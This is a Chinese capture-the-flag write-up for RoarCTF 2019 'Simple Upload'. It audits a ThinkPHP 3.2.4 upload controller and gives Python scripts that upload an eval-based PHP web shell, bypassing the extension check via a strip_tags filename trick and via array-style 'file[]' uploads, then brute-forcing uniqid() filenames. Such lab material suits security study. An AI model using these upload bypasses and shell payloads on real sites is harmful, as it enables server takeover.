# \[RoarCTF 2019]Simple Upload

## \[RoarCTF 2019]Simple Upload

## 考点

* ThinkPHP Upload类审计
* 利用逻辑错误绕过正则黑名单

## wp

```php
 <?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
} 
```

ThinkPHP的框架，版本为3.2.4，默认上传地址为/home/index/upload，路径为http://4031f467-bc7e-4af0-bcb0-14c3faf9f202.node4.buuoj.cn:81/index.php/home/index/upload

没有给上传的form，用Python脚本写一下上传的POST包

```python
import requests

session = requests.session()
url = 'http://4031f467-bc7e-4af0-bcb0-14c3faf9f202.node4.buuoj.cn:81/index.php/home/index/upload'
file1 = {'file': open('123.png', 'r')}

r = session.post(url, files=file1)
print(r.text)
```

返回了上传的信息

```
{"url":"\/Public\/Uploads\/2022-03-20\/623744eebd9f7.png","success":1}
```

找一下源码，Upload类的位置是`ThinkPHP/Library/Think/Upload.class.php`。看了一下，题目中定义的那些属性没有任何作用，因为根本没有传到Upload类的方法中。按照Upload类中对上传文件的限制是放在config属性中，本题则直接当做了Upload类的属性

```php
public function upload($files = ''){
    private $config = array(
        'mimes'        => array(), //允许上传的文件MiMe类型
        'maxSize'      => 0, //上传的文件大小限制 (0-不做限制)
        'exts'         => array(), //允许上传的文件后缀
        'autoSub'      => true, //自动子目录保存文件
        'subName'      => array('date', 'Y-m-d'), //子目录创建方式，[0]-函数名，[1]-参数，多个参数使用数组
        'rootPath'     => './Uploads/', //保存根路径
        'savePath'     => '', //保存路径
        'saveName'     => array('uniqid', ''), //上传文件命名规则，[0]-函数名，[1]-参数，多个参数使用数组
        'saveExt'      => '', //文件保存后缀，空则使用原后缀
        'replace'      => false, //存在同名是否覆盖
        'hash'         => true, //是否生成hash编码
        'callback'     => false, //检测文件是否存在回调，如果存在返回文件信息数组
        'driver'       => '', // 文件上传驱动
        'driverConfig' => array(), // 上传驱动配置
    );
    private $error = '';
    private $uploader;
/*
......
*/
    public function upload($files = ''){
        /* 逐个检测并上传文件 */
        $info = array();
        $files = $this->dealFiles($files);
        foreach ($files as $key => $file) {
            $file['name'] = strip_tags($file['name']);
            /*
            check
            */
    }
    private function check($file){
        /*
        check
        */
        if (!$this->checkMime($file['type'])) {
            $this->error = '上传文件MIME类型不允许！';
            return false;
        }
        /* 检查文件后缀 */
        if (!$this->checkExt($file['ext'])) {
            $this->error = '上传文件后缀不允许';
            return false;
        }
    }
    private function checkMime($mime){
        return empty($this->config['mimes']) ? true : in_array(strtolower($mime), $this->mimes);
    }
    private function checkExt($ext){
        return empty($this->config['exts']) ? true : in_array(strtolower($ext), $this->exts);
    }

    private function dealFiles($files){
        $fileArray = array();
        $n         = 0;
        foreach ($files as $key => $file) {
            if (is_array($file['name'])) {
                $keys  = array_keys($file);
                $count = count($file['name']);
                for ($i = 0; $i < $count; $i++) {
                    $fileArray[$n]['key'] = $key;
                    foreach ($keys as $_key) {
                        $fileArray[$n][$_key] = $file[$_key][$i];
                    }
                    $n++;
                }
            } else {
                $fileArray = $files;
                break;
            }
        }
        return $fileArray;
    }
}
```

这里有两种做法，一个是绕过后缀限制，一个是条件竞争

### 第一种做法

绕过后缀限制

传入的文件名在处理的时候会经过strip\_tags处理，它会剥去字符串中的 HTML、XML 以及 PHP 的标签，所以只要文件名为`a.<>php` 就可以绕过

```php
        foreach ($files as $key => $file) {
            $file['name']  = strip_tags($file['name']);
            if(!isset($file['key']))   $file['key']    =   $key;
            if(isset($finfo)){
                $file['type']   =   finfo_file ( $finfo ,  $file['tmp_name'] );
            }
```

把上传脚本的file1赋值改成`file1 = {'file': ('a.<>php','<?php eval($_GET["cmd"])?>')}`

![](../../.gitbook/assets/JZl3MWGdCre4FfV9Scu\_ahPeqUfj2S2T2LXULph3-s8.png)

访问即可。

### 第二种做法

条件竞争

ThinkPHP里的upload()函数在不传参的情况下是批量上传的，处理方式

```php
        $uploadFile = $_FILES['file'] ;

        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
```

`$uploadFile['name']`是个数组时就可以绕过了。并且ThinkPHP对上传文件命名是用`uniqid()` 这个伪随机函数，在上传之后可以爆破得到shell地址

```python
import requests
url = "http://4031f467-bc7e-4af0-bcb0-14c3faf9f202.node4.buuoj.cn:81/index.php/home/index/upload"
files = {'file':("1.txt","")}
# []不能少
files2={'file[]':('1.php',"<?php eval($_GET['cmd'])?>")}
r = requests.post(url,files = files)
print (r.text)
r = requests.post(url,files = files2)
print (r.text)
r = requests.post(url,files = files)
print (r.text)
```

返回结果

```
{"url":"\/Public\/Uploads\/2022-03-20\/623748565f69c.txt","success":1}
{"url":"\/Public\/Uploads\/","success":1}
{"url":"\/Public\/Uploads\/2022-03-20\/623748568783a.txt","success":1}
```

爆破脚本

```python
import requests
session = requests.session()
url = "http://4031f467-bc7e-4af0-bcb0-14c3faf9f202.node4.buuoj.cn:81/"
str = '0123456789abcdef'
for i in str:
    for j in str:
        for k in str:
            for o in str:
                for p in str:
                    url = target+i+j+k+o+p+".php"
                    r = session.get(url)
                    if r.status_code == 200:
                        print(url)
```

## 小结

1. ThinkPHP的3.2.4，默认上传地址为/home/index/upload，路径为http://ip/index.php/home/index/upload
2. 使用request上传文件
3. Upload类传入的文件名在处理的时候会经过strip\_tags处理
4. ThinkPHP里的Upload->upload()函数在不传参的情况下是批量上传的
5. ThinkPHP对上传文件命名是用`uniqid()` 这个伪随机函数
